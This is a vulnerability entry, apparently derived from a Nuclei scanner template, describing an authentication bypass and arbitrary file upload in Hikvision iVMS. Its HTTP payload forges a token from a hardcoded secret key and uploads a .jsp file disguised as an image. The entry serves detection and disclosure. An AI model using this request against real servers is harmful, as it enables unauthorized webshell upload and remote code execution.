# Vulnerability: Hikvison iVMS - File Upload Bypass
**Classification:** HIKVISION
**Source:** Nuclei Template (`hikvision-ivms-file-upload-bypass.yaml`)

## Description
Hikvision iVMS integrated security system has a vulnerability that allows arbitrary file uploads. Attackers can exploit this vulnerability by obtaining the encryption key to create a forged token. By using the forged token, they can make requests to the "/resourceOperations/upload" interface to upload files of their choice. This can lead to gaining unauthorized webshell access on the server, enabling remote execution of malicious code.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /eps/api/resourceOperations/upload?token={{to_upper(md5(concat("{{RootURL}}","/eps/api/resourceOperations/uploadsecretKeyIbuilding")))}} HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo

------WebKitFormBoundaryGEJwiloiPo
Content-Disposition: form-data; name="fileUploader";filename="{{randstr}}.jsp"
Content-Type: image/jpeg

{{randstr}}
------WebKitFormBoundaryGEJwiloiPo%20
```

